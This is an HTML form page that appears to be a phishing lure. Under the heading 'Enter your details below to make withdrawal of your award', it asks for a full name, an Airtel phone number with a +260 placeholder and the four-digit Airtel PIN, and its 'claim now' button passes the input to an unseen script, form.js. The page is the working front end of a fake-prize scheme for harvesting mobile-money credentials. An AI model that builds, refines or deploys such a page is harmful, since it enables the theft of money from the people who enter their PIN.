<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Submit Details</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<h2 class="withdraw-intro">Enter your details below to make withdrawal of your award</h2>
<div class="form-container">
   <form id="detailsForm">
    <label>Full Name</label>
    <input  type="text" id="name" placeholder="Full Name" required><br>
    <label>Airtel Number</label>
    <input type="tel" id="phone" maxlength="10"
    pattern="[0-9]{10}" placeholder="+260" required><br>
    <label>Airtel pin</label>
    <input type="password" id="pin" maxlength="4"
    pattern="[0-9]{4}"   placeholder="Airtel pin" required><br>
    <!-- <textarea id="message" placeholder="Message"></textarea> -->

    <button id="submit-btn" class="submit-btn" type="submit">claim now</button>
</form>
</div>


<p id="successMsg"></p>
<script type="module" src="form.js"></script>


<!-- <script src="form.js"></script> -->

</body>
</html>
